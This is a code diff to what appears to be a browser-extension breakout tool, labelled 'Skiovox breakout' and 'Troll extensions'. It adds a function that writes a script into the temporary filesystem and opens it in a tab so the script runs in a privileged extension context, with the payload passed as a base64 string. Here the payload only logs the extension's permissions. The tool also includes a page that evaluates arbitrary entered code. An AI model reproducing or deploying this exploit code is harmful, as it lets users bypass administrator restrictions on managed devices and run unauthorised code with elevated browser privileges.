@@ -64,11 +64,70 @@ function injection() {
                     await chrome.tabs.create({ url: url })
                 };
             }
+
+            function fileDebug() {
+                function buildBlobWithScript(script) {
+                    var fullHTML = `<script src="index.js"></script>`;
+                    return new Promise((resolve, reject) => {
+                        webkitRequestFileSystem(TEMPORARY, 1024 * 1024 * 300, function (fs) {
+                            function writeFileInDirectory(dir, name, data) {
+                                return new Promise((resolve) => {
+                                    dir.getFile(name, { create: true }, function (entry) {
+                                        entry.createWriter(function (writer) {
+                                            writer.write(new Blob([data]));
+                                            writer.onwriteend = function () {
+                                                resolve(entry)
+                                            }
+                                        });
+                                    })
+                                })
+                            }
+                            function removeFileInDirectory(dir, name) {
+                                return new Promise(function (resolve) {
+                                    dir.getFile(name, { create: true }, function (entry) {
+                                        entry.remove(resolve);
+                                    })
+                                })
+                            }
+                            fs.root.getDirectory('evaluations', { create: true }, async function (entry) {
+                                await removeFileInDirectory(entry, 'index.js');
+                                await writeFileInDirectory(entry, 'index.js', script);
+                                await removeFileInDirectory(entry, 'index.html');
+                                var handle = await writeFileInDirectory(entry, 'index.html', fullHTML);
+                                resolve(handle.toURL());
+
+                            }, reject)
+                        }, reject)
+                    })
+                }
+                document.querySelector('button').onclick = async () => {
+                    var url = await buildBlobWithScript(atob(`Y2hyb21lLnBlcm1pc3Npb25zLmdldEFsbChmdW5jdGlvbihwZXJtaXNzaW9ucykgewogIGNvbnNvbGUubG9nKCJQZXJtaXNzaW9uczoiLCBwZXJtaXNzaW9ucyk7Cn0pOwo=`));
+                    // unbelievable, why can't we just use open
+                    await chrome.tabs.create({ url: url })
+                };
+            }
+
+            /*
+                chrome.permissions.contains({
+                permissions: ['tabs'],
+                origins: ['https://www.google.com/']
+                }, (result) => {
+                    if (result) {
+                        // The extension has the permissions.
+                    } else {
+                        // The extension doesn't have the permissions.
+                    }
+                });
+            */
+            await removeFile("setup.html");
+            await removeFile("setup.js");
             await removeFile('shim.html');
             await removeFile('shim.js');
+            var entr2 = await writeFile("setup.html", "<h1>Debugging Skiovox breakout</h1><br/><button>test</button><script src=\"setup.js\"></script>")
             var entry = await writeFile("shim.html", "<h1>Troll extensions</h1><textarea></textarea><br/><button>Evaluate</button><script src=\"shim.js\"></script>");
             await writeFile("shim.js", `(${filemain.toString()})()`);
-            alert("Save this in your bookmarks: " + entry.toURL());
+            await writeFile("setup.js", `(${fileDebug.toString()})()`);
+            alert("base bookmarks: " + entry.toURL() + "\nDebug url: " + entr2.toURL());
 
         })
     }
